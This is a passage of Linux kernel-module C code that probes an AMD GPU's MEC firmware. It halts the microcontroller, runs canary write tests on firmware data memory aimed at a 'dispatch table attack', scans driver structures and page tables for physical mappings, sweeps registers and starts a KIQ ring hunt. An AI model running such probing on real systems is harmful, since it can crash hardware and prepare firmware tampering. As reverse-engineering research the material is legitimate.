				/* MM_INDEX indirect read */
				writel((u32)(addrs[a] + i * 4) | 0x80000000,
				       mmio + 0x0000 * 4);  /* MM_INDEX */
				writel((u32)((addrs[a] + i * 4) >> 31),
				       mmio + 0x0006 * 4);  /* MM_INDEX_HI */
				vals[i] = readl(mmio + 0x0001 * 4);  /* MM_DATA */
				if (vals[i] != 0) nonzero++;
				if (vals[i] != 0xFFFFFFFF) all_f = 0;
			}

			pr_info("fw36: MM_INDEX[0x%llX]: %08X %08X %08X %08X %08X %08X %08X %08X%s\n",
				addrs[a],
				vals[0], vals[1], vals[2], vals[3],
				vals[4], vals[5], vals[6], vals[7],
				(!nonzero) ? " (all-zero)" :
				(all_f) ? " (all-FF)" : " *** DATA ***");
		}
	}

	/* ===========================================
	 * APPROACH C: DM_INDEX with full halt sequence
	 *
	 * Previous attempt returned all-FF. This time:
	 * 1. Halt MEC cleanly (set HALT bit, wait for WFI)
	 * 2. Set DC_BASE_CNTL to enable data cache access
	 * 3. Try DM_INDEX reads at various addresses
	 * 4. Also try writing then reading back
	 * =========================================== */
	pr_info("fw36: === APPROACH C: DM_INDEX WITH HALT ===\n");
	{
		u32 rs64_cntl;
		int i;

		/* Halt MEC */
		rs64_cntl = rr(regCP_MEC_RS64_CNTL);
		wr(regCP_MEC_RS64_CNTL, rs64_cntl | (1 << CP_MEC_RS64_CNTL__MEC_HALT__SHIFT));
		udelay(100);

		pc_val = rr(regCP_MEC1_INSTR_PNTR);
		pr_info("fw36: MEC halted, PC = 0x%04X\n", pc_val);

		/* Try various DC_BASE_CNTL settings to enable DM access */
		{
			u32 dc_cntl_tries[] = {0x00000000, 0x00000001, 0x00000010, 0x00000011,
			                       0x00000100, 0x80000000, 0xFFFFFFFF};
			int c;

			for (c = 0; c < 7; c++) {
				u32 dm_vals[4];
				int nonzero = 0, all_f = 1;

				wr(regCP_MEC_DC_BASE_CNTL, dc_cntl_tries[c]);
				udelay(50);

				/* Read DM at address 0 (should be dispatch table start) */
				for (i = 0; i < 4; i++) {
					wr(regCP_MEC_DM_INDEX_ADDR, i * 4);
					udelay(10);
					dm_vals[i] = rr(regCP_MEC_DM_INDEX_DATA);
					if (dm_vals[i] != 0) nonzero++;
					if (dm_vals[i] != 0xFFFFFFFF) all_f = 0;
				}

				if (nonzero && !all_f) {
					pr_info("fw36: DC_BASE_CNTL=0x%08X DM[0..15]: "
						"%08X %08X %08X %08X *** LIVE DATA ***\n",
						dc_cntl_tries[c],
						dm_vals[0], dm_vals[1], dm_vals[2], dm_vals[3]);
				} else {
					pr_info("fw36: DC_BASE_CNTL=0x%08X DM[0..15]: "
						"%08X %08X %08X %08X%s\n",
						dc_cntl_tries[c],
						dm_vals[0], dm_vals[1], dm_vals[2], dm_vals[3],
						all_f ? " (all-FF)" : " (all-zero)");
				}
			}
		}

		/* Try DM_INDEX at specific offsets that might hold dispatch table */
		pr_info("fw36: === DM_INDEX OFFSET SWEEP ===\n");
		{
			/* MEC dispatch table offsets to try:
			 * 0x0000 = base, 0x0800 = PRGRM_CNTR_START (2048),
			 * 0x1000 = 4K, 0x2000 = 8K, 0x4000 = 16K
			 * Also try MIBOUND range edges */
			u32 dm_offsets[] = {0, 4, 8, 0x10, 0x20, 0x40, 0x80,
			                   0x100, 0x200, 0x400, 0x800,
			                   0x1000, 0x2000, 0x4000, 0x8000,
			                   0xC000, 0xF000, 0xFF00, 0xFFFC,
			                   0x10000, 0x20000, 0x3FFFC};
			int d;

			/* Restore DC_BASE_CNTL to original */
			wr(regCP_MEC_DC_BASE_CNTL, dc_base_cntl_orig);
			udelay(50);

			for (d = 0; d < 22; d++) {
				u32 val;
				wr(regCP_MEC_DM_INDEX_ADDR, dm_offsets[d]);
				udelay(10);
				val = rr(regCP_MEC_DM_INDEX_DATA);
				if (val != 0 && val != 0xFFFFFFFF)
					pr_info("fw36: DM[0x%05X] = 0x%08X *** DATA ***\n",
						dm_offsets[d], val);
				else
					pr_info("fw36: DM[0x%05X] = 0x%08X\n",
						dm_offsets[d], val);
			}
		}

		/* ===========================================
		 * APPROACH D: Write test to DM_INDEX
		 *
		 * If DM_INDEX is writable, we can inject dispatch
		 * table entries. Write a canary, read it back.
		 * Use a safe address deep in the data segment.
		 * =========================================== */
		pr_info("fw36: === APPROACH D: DM_INDEX WRITE TEST ===\n");
		{
			u32 test_addr = 0x3F000;  /* Near end of 256K data space */
			u32 orig_val, canary = 0xFEE1DEAD;
			u32 readback;

			/* Read original */
			wr(regCP_MEC_DM_INDEX_ADDR, test_addr);
			udelay(10);
			orig_val = rr(regCP_MEC_DM_INDEX_DATA);
			pr_info("fw36: DM[0x%X] original = 0x%08X\n", test_addr, orig_val);

			/* Write canary */
			wr(regCP_MEC_DM_INDEX_ADDR, test_addr);
			udelay(10);
			wr(regCP_MEC_DM_INDEX_DATA, canary);
			udelay(10);

			/* Read back */
			wr(regCP_MEC_DM_INDEX_ADDR, test_addr);
			udelay(10);
			readback = rr(regCP_MEC_DM_INDEX_DATA);

			if (readback == canary) {
				pr_info("fw36: *** DM WRITE SUCCESS *** wrote 0x%08X, read 0x%08X\n",
					canary, readback);
				pr_info("fw36: DATA MEMORY IS WRITABLE — dispatch table attack viable!\n");

				/* Restore original value */
				wr(regCP_MEC_DM_INDEX_ADDR, test_addr);
				udelay(10);
				wr(regCP_MEC_DM_INDEX_DATA, orig_val);
				udelay(10);
				pr_info("fw36: Restored original value 0x%08X\n", orig_val);
			} else {
				pr_info("fw36: DM write FAILED: wrote 0x%08X, read 0x%08X\n",
					canary, readback);
			}
		}

		/* Unhalt MEC */
		wr(regCP_MEC_RS64_CNTL, rs64_cntl_orig);
		udelay(100);
		pr_info("fw36: MEC unhalted, PC = 0x%04X\n", rr(regCP_MEC1_INSTR_PNTR));
	}

	/* ===========================================
	 * APPROACH E: Scan adev for MDBASE kernel mapping
	 *
	 * The driver allocated the data memory buffer somewhere.
	 * Scan adev for the MDBASE value or nearby GPU addresses
	 * with associated kernel pointers.
	 * =========================================== */
	pr_info("fw36: === APPROACH E: ADEV SCAN FOR MDBASE MAPPING ===\n");
	{
		int off, found = 0;
		u64 mdbase_lo32 = mdbase & 0xFFFFFFFFULL;
		u64 mdbase_page = mdbase & ~0xFFFULL;

		for (off = 8; off < 0x80000 && found < 20; off += 8) {
			u64 val = *(u64 *)((u8 *)adev + off);

			/* Match MDBASE exactly or page-aligned */
			if (val == mdbase || val == mdbase_page ||
			    (val & 0xFFFFFFFFULL) == mdbase_lo32) {
				u64 prev = *(u64 *)((u8 *)adev + off - 8);
				u64 next = *(u64 *)((u8 *)adev + off + 8);
				u64 next2 = *(u64 *)((u8 *)adev + off + 16);

				pr_info("fw36: adev+0x%X = 0x%llX (MDBASE match)\n", off, val);
				pr_info("fw36:   prev=0x%llX next=0x%llX next2=0x%llX\n",
					prev, next, next2);

				/* Check if neighbors are kernel pointers */
				if ((prev >> 48) == 0xFFFF && prev != 0xFFFFFFFFFFFFFFFFULL) {
					u32 hdr[8];
					if (copy_from_kernel_nofault(hdr, (void *)(unsigned long)prev, 32) == 0) {
						pr_info("fw36:   prev kptr data: %08X %08X %08X %08X "
							"%08X %08X %08X %08X\n",
							hdr[0], hdr[1], hdr[2], hdr[3],
							hdr[4], hdr[5], hdr[6], hdr[7]);
					}
				}
				if ((next >> 48) == 0xFFFF && next != 0xFFFFFFFFFFFFFFFFULL) {
					u32 hdr[8];
					if (copy_from_kernel_nofault(hdr, (void *)(unsigned long)next, 32) == 0) {
						pr_info("fw36:   next kptr data: %08X %08X %08X %08X "
							"%08X %08X %08X %08X\n",
							hdr[0], hdr[1], hdr[2], hdr[3],
							hdr[4], hdr[5], hdr[6], hdr[7]);
					}
				}
				found++;
			}
		}
		if (!found)
			pr_info("fw36: MDBASE value 0x%llX not found in adev scan\n", mdbase);
	}

	/* ===========================================
	 * APPROACH F: Read ALL MEC pipe MDBASE values
	 *
	 * Check if other pipes/queues have different MDBASE
	 * values that might be more accessible.
	 * Also read via indexed GC registers.
	 * =========================================== */
	pr_info("fw36: === APPROACH F: ALL PIPE MDBASE + GC INDEXED ===\n");
	{
		/* GC indexed registers from mode 16 scan: 0x5870-0x5873 are MDBASE/MIBOUND.
		 * Also check nearby offsets for per-pipe variants. */
		u32 gc_regs[] = {
			0x5870, 0x5871, 0x5872, 0x5873,  /* MDBASE_LO/HI, MIBOUND_LO/HI */
			0x5874, 0x5875, 0x5876, 0x5877,  /* possible pipe 1 */
			0x5878, 0x5879, 0x587A, 0x587B,  /* possible pipe 2 */
			0x587C, 0x587D, 0x587E, 0x587F,  /* possible pipe 3 */
			0x5880, 0x5881, 0x5882, 0x5883,  /* more */
			0x5884, 0x5885, 0x5886, 0x5887,
			0x5888, 0x5889, 0x588A, 0x588B,
			0x588C, 0x588D, 0x588E, 0x588F,
			0x5890, 0x5891, 0x5892, 0x5893,
			0x5894, 0x5895, 0x5896, 0x5897,
			0x5898, 0x5899, 0x589A, 0x589B,
		};
		int r;

		for (r = 0; r < 44; r++) {
			u32 val = rr(SOC15(gc_regs[r]));
			if (val != 0 && val != 0xFFFFFFFF)
				pr_info("fw36: GC[0x%04X] = 0x%08X\n", gc_regs[r], val);
		}

		/* Also try reading MDBASE for each pipe via pipe select register.
		 * CP_MEC_CNTL bits [3:2] = pipe select on some GFX versions */
		pr_info("fw36: Per-pipe MDBASE scan:\n");
		{
			u32 orig_mec_cntl = rr(regCP_MEC_CNTL);
			int pipe;
			for (pipe = 0; pipe < 4; pipe++) {
				u32 mc = (orig_mec_cntl & ~0x0C) | (pipe << 2);
				u64 md;
				u32 mi;
				wr(regCP_MEC_CNTL, mc);
				udelay(50);
				md = ((u64)rr(regCP_MEC_MDBASE_HI) << 32) | rr(regCP_MEC_MDBASE_LO);
				mi = rr(regCP_MEC_MIBOUND_LO);
				pr_info("fw36:   Pipe %d: MDBASE=0x%016llX MIBOUND=0x%08X\n",
					pipe, md, mi);
			}
			wr(regCP_MEC_CNTL, orig_mec_cntl);
			udelay(50);
		}
	}

	/* ===========================================
	 * APPROACH G: Direct BAR0 offset for MDBASE
	 *
	 * If MDBASE low bits fall within BAR0 range (256MB),
	 * we can read through mmio directly. Also try
	 * MDBASE as a PCI bus address via ioremap.
	 * =========================================== */
	pr_info("fw36: === APPROACH G: DIRECT ACCESS AT MDBASE ===\n");
	{
		u64 bar0_base = pci_resource_start(g_pdev, 0);
		u64 bar0_size = pci_resource_len(g_pdev, 0);
		u64 md_lo32 = mdbase & 0xFFFFFFFFULL;

		pr_info("fw36: BAR0 = 0x%llX size 0x%llX\n", bar0_base, bar0_size);

		if (md_lo32 < bar0_size) {
			u32 vals[4];
			int i;
			for (i = 0; i < 4; i++)
				vals[i] = readl(mmio + md_lo32 + i * 4);
			pr_info("fw36: BAR0+0x%llX: %08X %08X %08X %08X\n",
				md_lo32, vals[0], vals[1], vals[2], vals[3]);
		} else {
			pr_info("fw36: MDBASE low32 0x%llX > BAR0 size 0x%llX\n",
				md_lo32, bar0_size);
		}

		/* Try ioremap at MDBASE as physical address */
		{
			void __iomem *dm_io;
			dm_io = ioremap_wc(mdbase, 0x1000);
			if (dm_io) {
				u32 vals[8];
				int i, nonzero = 0;
				for (i = 0; i < 8; i++) {
					vals[i] = readl(dm_io + i * 4);
					if (vals[i] != 0) nonzero++;
				}
				pr_info("fw36: ioremap_wc(0x%llX): %08X %08X %08X %08X "
					"%08X %08X %08X %08X%s\n",
					mdbase,
					vals[0], vals[1], vals[2], vals[3],
					vals[4], vals[5], vals[6], vals[7],
					nonzero ? " *** DATA ***" : " (all-zero)");
				iounmap(dm_io);
			} else {
				pr_info("fw36: ioremap_wc(0x%llX) failed\n", mdbase);
			}
		}

		/* Try memremap at MDBASE (might be system RAM for GART-based) */
		{
			void *dm_mem;
			dm_mem = memremap(mdbase, 0x1000, MEMREMAP_WB);
			if (dm_mem) {
				u32 *p = (u32 *)dm_mem;
				int i, nonzero = 0;
				for (i = 0; i < 8; i++)
					if (p[i] != 0) nonzero++;
				pr_info("fw36: memremap(0x%llX): %08X %08X %08X %08X "
					"%08X %08X %08X %08X%s\n",
					mdbase,
					p[0], p[1], p[2], p[3],
					p[4], p[5], p[6], p[7],
					nonzero ? " *** DATA ***" : " (all-zero)");
				if (nonzero) {
					/* Dump first 1K for analysis */
					pr_info("fw36: === MDBASE DATA DUMP (first 1K) ===\n");
					for (i = 0; i < 256; i += 4) {
						if (p[i] || p[i+1] || p[i+2] || p[i+3])
							pr_info("fw36: MD[0x%03X]: %08X %08X %08X %08X\n",
								i * 4, p[i], p[i+1], p[i+2], p[i+3]);
					}
				}
				memunmap(dm_mem);
			} else {
				pr_info("fw36: memremap(0x%llX) failed\n", mdbase);
			}
		}
	}

	/* ===========================================
	 * APPROACH H: GPU MC page table walk for MDBASE
	 *
	 * MDBASE is a GPU virtual address in the MEC's VMID.
	 * Walk the GPU page table to find where it physically maps.
	 * PT_BASE from mode 12 = 0x207FB00001.
	 * =========================================== */
	pr_info("fw36: === APPROACH H: GPU PAGE TABLE WALK ===\n");
	{
		u64 pt_base = ((u64)rr(GC0(0x2926)) << 32) | rr(GC0(0x2925));
		u32 ctx_cntl = rr(GC0(0x2920));
		u32 depth;

		pr_info("fw36: VMID0 PT_BASE = 0x%016llX  CTX_CNTL = 0x%08X\n",
			pt_base, ctx_cntl);

		depth = ctx_cntl & 0x3;  /* page table depth */
		pr_info("fw36: PT depth = %u\n", depth);

		/* PT_BASE physical address (remove flags in low bits) */
		{
			u64 pt_phys = (pt_base >> 1) << 12;  /* bit 0 = valid, bits [47:1] << 12 = phys */
			u64 va = mdbase;
			void *pt_page;
			int level;
			u64 pte_phys = pt_phys;

			pr_info("fw36: PT root phys = 0x%llX, walking VA = 0x%llX\n",
				pt_phys, va);

			/* Walk up to 4 levels of page table */
			for (level = 0; level <= (int)depth && level < 4; level++) {
				u64 idx;
				u64 pte_val;
				u64 *pte_ptr;

				/* Each level indexes 9 bits of VA (512 entries per page) */
				/* For a 4-level walk: bits [47:39], [38:30], [29:21], [20:12] */
				idx = (va >> (39 - level * 9)) & 0x1FF;

				pt_page = memremap(pte_phys, 0x1000, MEMREMAP_WB);
				if (!pt_page) {
					pr_info("fw36: L%d: memremap(0x%llX) failed\n",
						level, pte_phys);
					break;
				}

				pte_ptr = (u64 *)pt_page;
				pte_val = pte_ptr[idx];
				pr_info("fw36: L%d: phys=0x%llX idx=%llu pte=0x%016llX%s\n",
					level, pte_phys, idx, pte_val,
					(pte_val & 1) ? " VALID" : " INVALID");

				/* Also dump neighboring PTEs for context */
				{
					int n;
					for (n = -2; n <= 2; n++) {
						int ni = (int)idx + n;
						if (ni >= 0 && ni < 512 && n != 0 && pte_ptr[ni] != 0)
							pr_info("fw36:   L%d[%d] = 0x%016llX\n",
								level, ni, pte_ptr[ni]);
					}
				}

				memunmap(pt_page);

				if (!(pte_val & 1)) {
					pr_info("fw36: PTE invalid at L%d — walk stops\n", level);
					break;
				}

				/* Check PTE type: bit 1 distinguishes PDE (0) from PTE (1) at leaf */
				if ((pte_val & 0x3) == 0x3 && level > 0) {
					/* This is a leaf PTE — extract physical address */
					u64 page_phys = (pte_val >> 12) << 12;
					u64 page_off = va & ((1ULL << (39 - level * 9)) - 1);
					u64 final_phys = page_phys + page_off;
					void *dm_mapped;

					pr_info("fw36: LEAF PTE at L%d: phys_page=0x%llX final_phys=0x%llX\n",
						level, page_phys, final_phys);

					/* Map and read the data memory! */
					dm_mapped = memremap(final_phys, 0x10000, MEMREMAP_WB);
					if (dm_mapped) {
						u32 *dm = (u32 *)dm_mapped;
						int i;
						pr_info("fw36: *** MDBASE DATA MEMORY MAPPED ***\n");
						for (i = 0; i < 256; i += 4) {
							if (dm[i] || dm[i+1] || dm[i+2] || dm[i+3])
								pr_info("fw36: DM[0x%04X]: %08X %08X %08X %08X\n",
									i * 4, dm[i], dm[i+1], dm[i+2], dm[i+3]);
						}
						memunmap(dm_mapped);
					} else {
						pr_info("fw36: memremap(final 0x%llX) failed\n", final_phys);
					}
					break;
				}

				/* PDE — next level phys */
				pte_phys = (pte_val >> 12) << 12;
			}
		}
	}

	/* ===========================================
	 * APPROACH I: CORRECT PT WALK via adev_rreg
	 *
	 * Mode H used GC0-relative reads which read wrong VMID.
	 * The correct VMID0 PT_BASE = 0x207FB00001 (from prior modes).
	 * Use that directly for the page table walk.
	 * =========================================== */
	pr_info("fw36: === APPROACH I: CORRECT VMID0 PT WALK ===\n");
	if (adev_rreg) {
		u64 pt_base_reg = ((u64)adev_rreg(adev, 0x1690, 0) << 32) |
		                   adev_rreg(adev, 0x168F, 0);
		u32 ctx_cntl = adev_rreg(adev, 0x168E, 0);
		u32 depth = ctx_cntl & 0x3;

		pr_info("fw36: VMID0 PT_BASE = 0x%016llX  CTX_CNTL = 0x%08X  depth = %u\n",
			pt_base_reg, ctx_cntl, depth);

		if (pt_base_reg & 1) {
			u64 pt_phys = (pt_base_reg >> 1) << 12;
			u64 va = mdbase;
			u64 pte_phys = pt_phys;
			int level;

			pr_info("fw36: PT root phys = 0x%llX\n", pt_phys);
			pr_info("fw36: Walking MDBASE VA = 0x%llX through %u-level PT\n",
				va, depth + 1);

			for (level = 0; level <= (int)depth && level < 4; level++) {
				u64 shift = 12 + 9 * (depth - level);
				u64 idx = (va >> shift) & 0x1FF;
				void *pt_page;
				u64 *pte_ptr;
				u64 pte_val;

				pt_page = memremap(pte_phys, 0x1000, MEMREMAP_WB);
				if (!pt_page) {
					pr_info("fw36: L%d: memremap(0x%llX) FAILED\n",
						level, pte_phys);
					break;
				}

				pte_ptr = (u64 *)pt_page;
				pte_val = pte_ptr[idx];

				pr_info("fw36: L%d: phys=0x%llX shift=%llu idx=%llu pte=0x%016llX%s\n",
					level, pte_phys, shift, idx, pte_val,
					(pte_val & 1) ? " VALID" : " INVALID");

				/* Dump neighbor PTEs */
				{
					int n;
					for (n = -3; n <= 3; n++) {
						int ni = (int)idx + n;
						if (ni >= 0 && ni < 512 && n != 0 && pte_ptr[ni] != 0)
							pr_info("fw36:   L%d[%d] = 0x%016llX%s\n",
								level, ni, pte_ptr[ni],
								(pte_ptr[ni] & 1) ? " V" : "");
					}
				}

				memunmap(pt_page);

				if (!(pte_val & 1)) {
					pr_info("fw36: PTE invalid at L%d — MDBASE not mapped in VMID0 PT\n",
						level);
					break;
				}

				/* Check if leaf PTE (bit 1 set = PTE, bit 1 clear = PDE) */
				if (pte_val & 2) {
					/* Leaf — extract physical page */
					u64 page_size = 1ULL << shift;
					u64 page_phys = (pte_val >> 12) << 12;
					u64 page_off = va & (page_size - 1);
					u64 final_phys = page_phys + page_off;
					void *dm_mapped;

					pr_info("fw36: *** LEAF PTE at L%d ***\n", level);
					pr_info("fw36: page_phys=0x%llX page_size=0x%llX\n",
						page_phys, page_size);
					pr_info("fw36: page_off=0x%llX final_phys=0x%llX\n",
						page_off, final_phys);

					/* Map and read the data memory */
					dm_mapped = memremap(final_phys, 0x10000, MEMREMAP_WB);
					if (dm_mapped) {
						u32 *dm = (u32 *)dm_mapped;
						int i, nonzero = 0;

						/* Count non-zero/non-FF words */
						for (i = 0; i < 256; i++) {
							if (dm[i] != 0 && dm[i] != 0xFFFFFFFF)
								nonzero++;
						}

						pr_info("fw36: *** MEC DATA MEMORY MAPPED ***\n");
						pr_info("fw36: %d non-trivial dwords in first 1K\n",
							nonzero);

						/* Dump first 4K */
						for (i = 0; i < 1024; i += 4) {
							if (dm[i] || dm[i+1] || dm[i+2] || dm[i+3])
								pr_info("fw36: DM[0x%04X]: %08X %08X %08X %08X\n",
									i * 4, dm[i], dm[i+1], dm[i+2], dm[i+3]);
						}

						/* Write test at safe offset */
						{
							u32 orig = dm[0x3F00/4];
							u32 canary = 0xFEE1DEAD;
							dm[0x3F00/4] = canary;
							mb();
							if (dm[0x3F00/4] == canary) {
								pr_info("fw36: *** DATA MEMORY IS WRITABLE ***\n");
								dm[0x3F00/4] = orig;
								mb();
							} else {
								pr_info("fw36: Write test: wrote 0x%08X read 0x%08X\n",
									canary, dm[0x3F00/4]);
							}
						}

						memunmap(dm_mapped);
					} else {
						pr_info("fw36: memremap(0x%llX) failed\n", final_phys);

						/* Try ioremap */
						{
							void __iomem *dm_io = ioremap_wc(final_phys, 0x10000);
							if (dm_io) {
								int i;
								pr_info("fw36: ioremap_wc(0x%llX) OK\n", final_phys);
								for (i = 0; i < 16; i++) {
									u32 v = readl(dm_io + i * 4);
									if (v != 0 && v != 0xFFFFFFFF)
										pr_info("fw36: DM[0x%02X] = 0x%08X ***\n",
											i * 4, v);
								}
								iounmap(dm_io);
							} else {
								pr_info("fw36: ioremap_wc also failed\n");
							}
						}
					}
					break;
				}

				/* PDE — descend to next level */
				pte_phys = (pte_val >> 12) << 12;
			}
		} else {
			pr_info("fw36: PT_BASE not valid (bit 0 = 0)\n");
		}
	} else {
		pr_info("fw36: adev_rreg not available\n");
	}

	/* ===========================================
	 * APPROACH J: MEC Ring Buffer / HQD probe
	 *
	 * The MEC's data memory is accessed through its hardware
	 * queue descriptors (HQDs). The ring buffer base addresses
	 * in the HQD registers point to VRAM or GART memory that
	 * contains PM4 packets. These are READ/WRITE by the MEC.
	 * If we can find the MEC's active HQD, its RPTR/WPTR and
	 * ring buffer are in accessible memory.
	 *
	 * Also: CP_MEC_ME1_HEADER_DUMP shows the last PM4 header
	 * the MEC decoded — this tells us about dispatch state.
	 * =========================================== */
	pr_info("fw36: === APPROACH J: MEC HQD + RING STATE ===\n");
	{
		/* Read various CP_HQD registers via indexed access */
		u32 hqd_regs[] = {
			/* HQD queue selector */
			0x2920,  /* CP_HQD_ACTIVE — which queues active */
			0x2921,  /* CP_HQD_VMID */
			0x2922,  /* CP_HQD_PQ_BASE_LO */
			0x2923,  /* CP_HQD_PQ_BASE_HI */
			0x2924,  /* CP_HQD_PQ_RPTR */
			0x2925,  /* probably different */
			0x2940,  /* CP_HQD_PQ_WPTR_LO */
			0x2941,  /* CP_HQD_PQ_WPTR_HI */
			0x2942,  /* CP_HQD_PQ_CONTROL */
		};
		int h;

		for (h = 0; h < 9; h++) {
			u32 val = rr(SOC15(hqd_regs[h]));
			if (val != 0 && val != 0xFFFFFFFF)
				pr_info("fw36: SOC15(0x%04X) = 0x%08X\n",
					hqd_regs[h], val);
		}

		/* Also try CP_MEC header/debug registers */
		{
			u32 debug_regs[] = {
				0x2905,  /* CP_MEC_ME1_HEADER_DUMP */
				0x2906,  /* CP_MEC_ME2_HEADER_DUMP */
				0x2907,  /* CP_MEC_DOORBELL_RANGE_LOWER */
				0x2908,  /* CP_MEC_DOORBELL_RANGE_UPPER */
				0x2909,  /* might be scratch */
				0x290A,  /* might be MQID */
				0x290D,  /* possible DC_APERTURE */
				0x290E,  /* possible DC_APERTURE_HI */
				0x2910,  /* CP_MEC_RS64_INTERRUPT */
				0x2911,  /* CP_MEC_RS64_INTR_CNTL */
				0x2939,  /* CP_MEC_RS64_PERFCOUNT_CNTL */
				0x293A,  /* CP_MEC_RS64_PERFCOUNT */
				0x293B,  /* possible GP0/1 shadow */
				0x293C,
				0x293D,
				0x293E,
				0x293F,
			};
			int d;

			pr_info("fw36: MEC debug/control registers:\n");
			for (d = 0; d < 17; d++) {
				u32 val = rr(SOC15(debug_regs[d]));
				if (val != 0 && val != 0xFFFFFFFF)
					pr_info("fw36: RS64[0x%04X] = 0x%08X\n",
						debug_regs[d], val);
			}
		}

		/* Try MEC General Purpose registers (GP0-GP3)
		 * These are writable scratch registers the MEC firmware uses.
		 * If we can write them, we might influence MEC behavior. */
		pr_info("fw36: === MEC GP REGISTER WRITE TEST ===\n");
		{
			u32 gp_regs[] = {0x2960, 0x2961, 0x2962, 0x2963,
			                 0x2970, 0x2971, 0x2972, 0x2973};
			int g;

			for (g = 0; g < 8; g++) {
				u32 orig = rr(SOC15(gp_regs[g]));
				u32 canary = 0xFEE10000 | g;
				wr(SOC15(gp_regs[g]), canary);
				udelay(10);
				u32 readback = rr(SOC15(gp_regs[g]));
				if (readback == canary) {
					pr_info("fw36: GP[0x%04X]: orig=0x%08X WRITABLE (wrote 0x%08X)\n",
						gp_regs[g], orig, canary);
					/* Restore */
					wr(SOC15(gp_regs[g]), orig);
				} else {
					pr_info("fw36: GP[0x%04X]: orig=0x%08X write FAILED (read 0x%08X)\n",
						gp_regs[g], orig, readback);
				}
			}
		}
	}

	/* ===========================================
	 * APPROACH K: Deep HQD scan + MEC mapped register sweep
	 *
	 * The compute queues' HQD structures live in GPU registers.
	 * We need to find active compute queues and their ring buffer
	 * base addresses (PQ_BASE), which point to accessible VRAM/GART.
	 *
	 * Also sweep wider range of CP_MEC registers to find any
	 * writable interface to data memory or dispatch state.
	 * =========================================== */
	pr_info("fw36: === APPROACH K: DEEP HQD + MEC REGISTER SWEEP ===\n");
	{
		/* Scan 0x2900-0x2980 exhaustively for non-zero, non-FF */
		int r;
		pr_info("fw36: SOC15 0x2900-0x2980 full scan:\n");
		for (r = 0x2900; r < 0x2980; r++) {
			u32 val = rr(SOC15(r));
			if (val != 0 && val != 0xFFFFFFFF)
				pr_info("fw36: [0x%04X] = 0x%08X\n", r, val);
		}

		/* Scan CP_HQD and KIQ registers 0x4E00-0x4EFF */
		pr_info("fw36: SOC15 0x4E00-0x4F00 (HQD/KIQ) scan:\n");
		for (r = 0x4E00; r < 0x4F00; r++) {
			u32 val = rr(SOC15(r));
			if (val != 0 && val != 0xFFFFFFFF)
				pr_info("fw36: [0x%04X] = 0x%08X\n", r, val);
		}

		/* Scan CP_MQD registers 0x4F00-0x5000 */
		pr_info("fw36: SOC15 0x4F00-0x5000 (MQD) scan:\n");
		for (r = 0x4F00; r < 0x5000; r++) {
			u32 val = rr(SOC15(r));
			if (val != 0 && val != 0xFFFFFFFF)
				pr_info("fw36: [0x%04X] = 0x%08X\n", r, val);
		}

		/* Scan 0x5840-0x58FF (indexed regs we partially saw) */
		pr_info("fw36: SOC15 0x5840-0x5900 (indexed) scan:\n");
		for (r = 0x5840; r < 0x5900; r++) {
			u32 val = rr(SOC15(r));
			if (val != 0 && val != 0xFFFFFFFF)
				pr_info("fw36: [0x%04X] = 0x%08X\n", r, val);
		}
	}

	/* ===========================================
	 * APPROACH L: adev MEC structure deep probe
	 *
	 * The driver's gfx.mec struct contains:
	 *   - mqd_backup[] — saved MQD state per queue
	 *   - hpd_eop_obj — EOP signal buffer (mapped in VRAM)
	 *   - mec_fw_obj — firmware BO (but encrypted)
	 *   - mec_fw_data_obj — DATA memory BO (THIS IS WHAT WE WANT)
	 *
	 * The data firmware BO is separate from the code BO.
	 * It should have a kaddr we can read/write directly.
	 * =========================================== */
	pr_info("fw36: === APPROACH L: ADEV MEC DATA FW BO HUNT ===\n");
	{
		/* In RDNA4/GFX12, the driver loads two separate firmware blobs:
		 * - mec_fw (code) → goes to IC_BASE (encrypted by PSP)
		 * - mec_fw_data (data) → goes to MDBASE
		 *
		 * Search adev for the MDBASE value with adjacent kernel pointers.
		 * Also search for patterns: a kptr followed by MDBASE mc_addr.
		 *
		 * Pattern: [bo_ptr(kptr)] [mc_addr=MDBASE] [gpu_addr] [kaddr(kptr)]
		 *   or:    [kaddr(kptr)] [mc_addr=MDBASE]
		 */
		int off, found = 0;
		u64 mdbase_page = mdbase & ~0xFFFULL;

		/* Wider scan: look for any 64-bit value where low 40 bits
		 * match MDBASE low 40 bits */
		for (off = 0; off < 0x80000 && found < 30; off += 8) {
			u64 val = *(u64 *)((u8 *)adev + off);

			/* Match lower 40 bits of MDBASE */
			if ((val & 0xFFFFFFFFFFULL) == (mdbase & 0xFFFFFFFFFFULL) ||
			    /* Or match page-aligned MDBASE */
			    val == mdbase_page ||
			    /* Or match MDBASE shifted >> 12 (PFN) */
			    val == (mdbase >> 12)) {

				int ctx;
				pr_info("fw36: adev+0x%05X = 0x%016llX (MDBASE-related)\n",
					off, val);
				/* Print surrounding 64 bytes */
				for (ctx = -32; ctx <= 32; ctx += 8) {
					int co = off + ctx;
					if (co >= 0 && co < 0x80000 && ctx != 0) {
						u64 cv = *(u64 *)((u8 *)adev + co);
						const char *tag = "";
						if ((cv >> 48) == 0xFFFF && cv != 0xFFFFFFFFFFFFFFFFULL)
							tag = " (kptr)";
						else if (cv >= 0x8000000000ULL && cv <= 0x9800000000ULL)
							tag = " (VRAM)";
						pr_info("fw36:   [+0x%05X] = 0x%016llX%s\n",
							co, cv, tag);
					}
				}
				found++;
			}
		}
		if (!found) {
			pr_info("fw36: No MDBASE-related values in adev (40-bit match)\n");

			/* Last resort: scan for any value in the 0x3B7000000000-0x3B7FFFFFFFFF range */
			pr_info("fw36: Scanning for 0x3B7x range:\n");
			for (off = 0; off < 0x80000; off += 8) {
				u64 val = *(u64 *)((u8 *)adev + off);
				if ((val >> 36) == 0x3B7 && val != 0) {
					pr_info("fw36: adev+0x%05X = 0x%016llX (0x3B7x range)\n",
						off, val);
					found++;
					if (found >= 10) break;
				}
			}
		}
	}

	/* ===========================================
	 * APPROACH M: KIQ Ring Buffer Hunt
	 *
	 * The Kernel Interface Queue (KIQ) is a special compute queue
	 * that the driver uses to manage all other compute queues.
	 * Its ring buffer is DMA-allocated in system memory.
	 * If we can find and write to it, we can submit MEC commands.
	 *
	 * The driver stores KIQ state in adev->gfx.kiq[0].ring.
	 * The ring struct contains:
	 *   - ring_obj (BO pointer)
	 *   - gpu_addr (MC address of ring buffer)
	 *   - ring (CPU VA of ring buffer)
	 *   - ring_size (bytes)
	 *   - wptr / rptr
	 *
	 * Key: The KIQ ring can submit MAP_QUEUES packets that
	 * tell MEC where to find compute queue state (MQD).
	 * =========================================== */
	pr_info("fw36: === APPROACH M: KIQ RING BUFFER HUNT ===\n");
	{
		int off, found = 0;
